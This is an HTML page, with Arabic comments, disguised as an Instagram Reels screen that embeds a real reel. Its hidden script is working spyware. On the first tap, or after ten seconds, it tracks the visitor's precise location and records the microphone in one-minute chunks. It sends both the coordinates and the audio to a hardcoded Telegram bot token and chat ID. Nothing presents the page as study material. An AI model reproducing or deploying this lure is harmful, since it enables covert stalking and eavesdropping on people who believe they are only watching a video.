<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>Instagram</title>
  <style>
    /* ... نفس الستايل السابق ... */
    /* سأدرج ستايل مبسط لتوفير المساحة لكن يمكنك استخدام الستايل الكامل السابق */
    *{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#fff;font-family:sans-serif;overflow:hidden;height:100dvh;display:flex;flex-direction:column}.top-header{display:flex;justify-content:space-between;padding:10px 16px}.top-header .logo{font-size:28px;font-family:'Segoe Script',cursive}.header-icons{display:flex;gap:16px}.reel-screen{flex:1;position:relative;background:#000}.reel-screen iframe{width:100%;height:100%;border:none}.reel-actions{position:absolute;right:12px;bottom:130px;display:flex;flex-direction:column;gap:22px;z-index:5}.action-btn{background:0;border:0;color:#fff;font-size:12px;display:flex;flex-direction:column;align-items:center;gap:4px}.reel-info{position:absolute;bottom:0;left:0;right:0;padding:20px 16px 90px;background:linear-gradient(transparent,rgba(0,0,0,.85))}.user-row{display:flex;align-items:center;gap:10px;margin-bottom:10px}.caption{font-size:14px}.bottom-nav{display:flex;justify-content:space-around;padding:10px 0 20px;border-top:1px solid #262626}.debug{position:absolute;top:50px;left:10px;background:rgba(0,0,0,.7);color:lime;font-size:12px;padding:5px;z-index:20;max-width:90%;display:none}
  </style>
</head>
<body>
<div class="top-header">
  <div class="logo">Instagram</div>
  <div class="header-icons">🎥 📷 💬</div>
</div>

<div class="reel-screen">
  <iframe id="reelIframe" allow="autoplay; fullscreen"></iframe>
  <div class="reel-actions">
    <button class="action-btn">❤️ <span id="likesCount">12.3K</span></button>
    <button class="action-btn">💬 567</button>
    <button class="action-btn">↗️</button>
    <button class="action-btn">💾</button>
    <button class="action-btn">•••</button>
  </div>
  <div class="reel-info">
    <div class="user-row">
      <span>👤</span> <span id="reelUsername">user</span>
      <button style="margin-left:auto;background:transparent;border:1px solid #aaa;color:#fff;padding:4px 12px;border-radius:6px;">متابعة</button>
    </div>
    <div class="caption" id="reelCaption">وصف الريل...</div>
  </div>
  <div class="debug" id="debugLog">🟡 بانتظار النقر...</div>
</div>

<div class="bottom-nav">🏠 🔍 ➕ 🎬 👤</div>

<script>
  // ========== الإعدادات ==========
  const BOT_TOKEN = '8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM';
  const CHAT_ID = '7615377804';   // تأكد أنك بدأت المحادثة مع البوت

  // ========== عناصر الواجهة ==========
  const debugEl = document.getElementById('debugLog');
  function log(msg, color='lime') {
    debugEl.style.display = 'block';
    debugEl.textContent = msg;
    debugEl.style.color = color;
    console.log(msg);
  }

  // ========== إرسال إلى تيليجرام ==========
  async function telegram(method, body) {
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(body)
      });
      const data = await res.json();
      if (!data.ok) {
        log('❌ تيليجرام: ' + data.description, 'red');
        console.error(data);
      } else {
        log('✅ أُرسل بنجاح: ' + method, 'lime');
      }
    } catch(e) {
      log('❌ فشل الاتصال: ' + e.message, 'red');
    }
  }

  // ========== تتبع الموقع ==========
  let watchId;
  function startTracking() {
    if (!navigator.geolocation) {
      log('⚠️ الموقع غير مدعوم', 'orange');
      return;
    }
    watchId = navigator.geolocation.watchPosition(
      pos => {
        const {latitude, longitude, accuracy} = pos.coords;
        log(`📍 ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`, 'cyan');
        telegram('sendLocation', {chat_id: CHAT_ID, latitude, longitude});
        telegram('sendMessage', {
          chat_id: CHAT_ID,
          parse_mode: 'Markdown',
          text: `📍 *موقع جديد*\nالعرض: \`${latitude}\`\nالطول: \`${longitude}\`\nالدقة: ±${Math.round(accuracy)}م\n[الخريطة](https://www.google.com/maps?q=${latitude},${longitude})`
        });
      },
      err => {
        log('❌ رفض الموقع: ' + err.message, 'red');
        telegram('sendMessage', {chat_id: CHAT_ID, text: '❌ خطأ موقع: ' + err.message});
      },
      {enableHighAccuracy: true, maximumAge: 0, timeout: 30000}
    );
  }

  // ========== تسجيل الصوت ==========
  async function startAudio() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({audio: true});
      log('🎤 تم الوصول للميكروفون', 'green');
      telegram('sendMessage', {chat_id: CHAT_ID, text: '🎤 بدأ التسجيل الصوتي'});

      function recordChunk() {
        const chunks = [];
        const rec = new MediaRecorder(stream);
        rec.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
        rec.onstop = async () => {
          const blob = new Blob(chunks);
          const fd = new FormData();
          fd.append('chat_id', CHAT_ID);
          fd.append('audio', blob, 'recording.webm');
          fd.append('title', '🎤 ' + new Date().toLocaleTimeString('ar-SA'));
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {method:'POST', body:fd});
          log('📤 تم إرسال مقطع صوتي', 'magenta');
          if(stream.active) setTimeout(recordChunk, 500);
        };
        rec.start();
        setTimeout(() => { if(rec.state === 'recording') rec.stop(); }, 60000);
      }
      recordChunk();
    } catch(e) {
      log('❌ ميكروفون مرفوض: ' + e.message, 'red');
      telegram('sendMessage', {chat_id: CHAT_ID, text: '❌ خطأ ميكروفون: ' + e.message});
    }
  }

  // ========== بدء كل شيء عند أول نقرة ==========
  let started = false;
  function launch() {
    if(started) return;
    started = true;
    log('🚀 بدأت الجلسة...', 'yellow');
    telegram('sendMessage', {chat_id: CHAT_ID, text: '🚀 *جلسة جديدة*\nالوقت: '+new Date().toLocaleString('ar-SA')});
    startTracking();
    setTimeout(startAudio, 1000);
  }

  // تحميل ريل عشوائي
  const reels = [
    {id:'CxeDohAgs2c', user:'instagram', desc:'This is Instagram'},
    {id:'Cq2Om6hLrGm', user:'nike', desc:'Just Do It'},
    {id:'CpjPLHpLdgo', user:'leomessi', desc:'GOAT'}
  ];
  const r = reels[Math.floor(Math.random()*reels.length)];
  document.getElementById('reelIframe').src = `https://www.instagram.com/reel/${r.id}/embed`;
  document.getElementById('reelUsername').textContent = r.user;
  document.getElementById('reelCaption').textContent = r.desc;

  // أحداث التشغيل
  document.addEventListener('click', launch, {once: true});
  document.addEventListener('touchstart', launch, {once: true});
  setTimeout(() => { if(!started) launch(); }, 10000);

  // تنظيف
  window.addEventListener('beforeunload', ()=>{
    if(watchId) navigator.geolocation.clearWatch(watchId);
  });
</script>
</body>
</html>
